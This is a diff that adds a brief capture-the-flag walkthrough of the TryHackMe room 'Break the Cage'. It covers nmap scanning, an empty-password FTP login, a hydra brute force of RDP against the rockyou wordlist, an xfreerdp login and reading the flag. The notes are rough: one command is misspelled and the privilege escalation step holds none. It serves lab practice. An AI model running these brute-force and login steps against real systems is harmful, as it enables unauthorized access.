@@ -1,0 +1,52 @@
+----------------                               ------------------
+               :::::::::::;| BREAK THE CAGE |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "BREAK THE CAGE".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"it's a Windows machine".
+
+2. How many ports are open?
+ANS: 3 ports (21/FTP, 80/HTTP, 3389/RDP)
+
+3. What's on port 21?
+ANS: FTP with "cage" user directory!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (FTP EXPLOIT)
+
+1. CHECK FTP.
+
+    ftp <ip>
+    Username: cage
+    Password: (try empty)
+    "FOUND staff.txt with password hint!"
+
+2. BRUTE FORCE RDP.
+
+    hydra -l cage -P /usr/share/wordlists/rockyou.txt rdp://<ip>
+    "FOUND PASSWORD: password123"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. LOGIN TO RDP.
+
+    xfreerdp /v:<ip> /u:cage /p:password123
+    "CHECK Desktop for flag.txt!"
+
+FLAGS:
+    type C:\Users\cage\Desktop\flag.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- CAGE BROKEN ----------
